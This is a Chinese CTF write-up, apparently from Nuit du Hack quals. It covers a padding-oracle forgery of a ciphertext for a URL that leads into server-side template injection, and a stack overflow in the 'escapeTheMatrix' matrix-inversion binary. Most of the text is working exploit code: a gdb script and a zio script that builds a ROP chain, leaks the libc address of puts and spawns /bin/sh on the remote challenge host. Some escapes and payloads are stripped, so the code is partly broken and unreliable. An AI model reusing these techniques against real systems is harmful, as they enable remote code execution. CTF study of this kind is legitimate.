    ans   =[
            "http://xxx.xxx.x",
            "x.xxx:8000/xxxxx",
            "xxxxxxxxxxxxxxxx",
            "/master/READMEx02x02"
           ]
    tmp_ans=[""]*5
    tmp_ans[4]=cipher[4]
    tmp_ans[3]=cipher[3]
    tmp_middle=middle[2].decode('hex')
    tmp_ans[2]=xor(ans[2],tmp_middle).encode("hex")
    tmp_middle=padding_oracle(N,tmp_ans[2].decode("hex"))
    print tmp_middle.encode('hex')   #"9d41e1434f05be3bea284b8d2eb8928b".decode('hex')
    tmp_ans[1]=xor(ans[1],tmp_middle).encode("hex")
    tmp_middle=padding_oracle(N,tmp_ans[1].decode("hex"))
    print tmp_middle.encode('hex')   #"c05b49fef1d14b17aa0dd98a591ea57f".decode('hex')
    tmp_ans[0]=xor(ans[0],tmp_middle).encode("hex")
    view="".join(i for i in tmp_ans)
    print view
    #a82f3d8ecbfe64269a39f7bb6f2e8b4bae6fd0767b3f860bda1864f556c0eaf383fb3b7b46bada5958de0b5ac55df1e340d56ae51399ceb30b5b69153ddc230219e3f662023665e8885c90867b8c3a02
通过上述代码,我得到我的这个链接
http://xxx.xxx.xx.xxx:8000/xxxxxxxxxxxxxxxxxxxxx/master/README 对应的密文是
a82f3d8ecbfe64269a39f7bb6f2e8b4bae6fd0767b3f860bda1864f556c0eaf383fb3b7b46bada5958de0b5ac55df1e340d56ae51399ceb30b5b69153ddc230219e3f662023665e8885c90867b8c3a02
然后修改我的网站的README的内容为
注意下我的这个内容外面包了两个反撇号，因为我们刚才说了，他会读取链接的内容，然后进行markdown转换，然后在进行模板渲染。markdown，转换在先，很多我们需要用的符号在markdown里面都有特殊语义会被转换，加上这两个反撇号就好了。
然后尝试访问
结果如下：
成功了,
好的,接下来就找出 SSTI 的payload执行一波命令,发现失败了,经过一番测试才知道题目用的环境是 python3 ,而平时
做的题目之类的都是 python2 ,那么开始在python3下面寻找姿势。
最后 payload 如下:
直接访问得到flag如下:
**escapeTheMatrix**
题目是个矩阵求逆的过程，如下：
初始化的时候，矩阵行和列最大可为16*16，如下：
但是逆矩阵的存储最大只有15*15，因此可以溢出，
矩阵里面存储的是double类型的数据，如下所示：
计算时会损失精度，数值不好控制，但是如果数量级一样的话，尾数部分占了52bit，是相对比较精确的，为了提高精度，将参与的数值计算的数取得越少越好，及将矩阵里面存储的数值绝大部分设为0，要求逆矩阵，那么最好是从单位矩阵开始修改，如下：
    arrays = [
    1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
    0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
    0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,
    0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,
    0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,
    0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,
    0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,
    0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,
    0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,
    0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,
    0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,
    0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,
    0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,
    0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0, 
    0,0,0,0,0,a,b,c,d,e, f, g, h,i,1,0,
    0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1]
如果该矩阵是存储的结果即逆矩阵，那么此时从a开始的位置，会在函数返回时当成rip，矩阵求逆的过程是可逆的，因此，为了求得固定的逆矩阵，可以将结果当成输入，即把a~i处的值替换成目的结果，求出最原始的的值，由于输入前也不好控制，因此在这里，直接写个gdb脚本来设置如下：
    target_name = "escapeTheMatrix_patch"
    gdb.execute('file %s'%target_name)
    proc_pid = execute_external_output("pidof %s"%target_name)[0].split(' ')[0]
    gdb.execute("attach %s"%proc_pid)
    gdb.execute("b *0x401018")
    gdb.execute("c")
    val_list = [0x401c33, 
    0x400a60, 
    0x401c31, 
    0x603020,
    0x400D75
    ]
    for i in range(len(val_list)):
    gdb.execute("set *(long long*)($rsi+0x20+0x10*14*8+(5+%d)*8)=0x%x"%(i, val_list[i]))
    gdb.execute("b *0x4010F2")
    gdb.execute("c")
将最终的结果，求出来以后，转换得到高精度的值，即求得小数点后面位数越多越好，如下：
    #include 
    int main()
    {
    while (1)
    {
    long long val;
    printf(">> ");
    scanf("%llx", &val);
    printf("%.32en", *(double *)&val);
    }
    }
这样求出的结果直接转换成输入即可，最终利用代码如下：
    from zio import *
    is_local = True
    is_local = False
    binary_path = "./escapeTheMatrix_patch"
    libc_file_path = ""
    #libc_file_path = "./libc.so.6"
    ip = "escapethematrix.quals.nuitduhack.com"
    port = 50505
    if is_local:
    target = binary_path
    else:
    target = (ip, port)
    def get_io(target):
    r_m = COLORED(RAW, "green")
    w_m = COLORED(RAW, "blue")
    #io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)
    io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m, env={"LD_PRELOAD":libc_file_path})
    return io
    def pwn_with_array(io, val_list):
    arrays = [
    1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
    0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
    0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,
    0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,
    0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,
    0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,
    0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,
    0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,
    0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,
    0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,
    0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,
    0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,
    0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,
    0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0, 
    #1,2,3,0xcd,0xee,0xff,0x5,6,7,8,9,2,2,2,2,2,
    0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,
    0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1]
    for i in range(len(val_list)):
    arrays[14 * 16 + 5 + i] = val_list[i]
    io.read_until(" : ")
    io.writeline(str(16))
    io.read_until(" : ")
    io.writeline(str(16))
    io.read_until(" :")
    payload = ""
    for item in arrays:
    payload += str(item) + ","
    io.writeline(payload[:-1])
    io.read_until("This is your result")
    io.read_until("0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,nn")
    return 
    def pwn(io):
    #offset info
    if is_local:
    #local
    offset_puts                = 0x6f690
    offset_system = 0x45390
    else:
    #remote
    offset_system = 0x45800
    offset_puts                = 0x70a90
    p_rdi_ret_val = -2.07582817451185170402836984431807e-317
    puts_got_val = -3.11447916067854977526319411883167e-317
    puts_plt_val = -2.07357375296987809604729216091621e-317
    #puts_got -8
    puts_got_8_val = -3.11447520815338304529084070628132e-317
    main_addr_val = -2.07424074159176377888193052878658e-317
    show_info_val = -2.07415428010374156073669962924783e-317
    get_buff_val = -2.07396357076444683957064747369378e-317
    val_list = []
    val_list.append(p_rdi_ret_val)
    val_list.append(puts_got_val)
    val_list.append(puts_plt_val)
    val_list.append(main_addr_val)
    """
    p_rdi_ret = 0x0000000000401c33
    puts_plt                   = 0x0000000000400a60
    p_rsi_r15_ret = 0x0000000000401c31
    get_buff_addr = 0x400D75
    puts_got = 0x0000000000603020
    """
    pwn_with_array(io, val_list)
    data = io.read(6)+"x00"*2
    print repr(data)
    puts_addr = l64(data)
    libc_base = puts_addr - offset_puts
    system_addr = libc_base + offset_system
    print hex(libc_base)
    print hex(system_addr)
    val_list = []
    val_list.append(p_rdi_ret_val)
    val_list.append(puts_got_8_val)
    val_list.append(get_buff_val)
    val_list.append(p_rdi_ret_val)
    val_list.append(puts_got_8_val)
    val_list.append(puts_plt_val)
    pwn_with_array(io, val_list)
    io.writeline("/bin/shx00" + l64(system_addr))
    io.interact()
    io = get_io(target)
    pwn(io)
flag如下：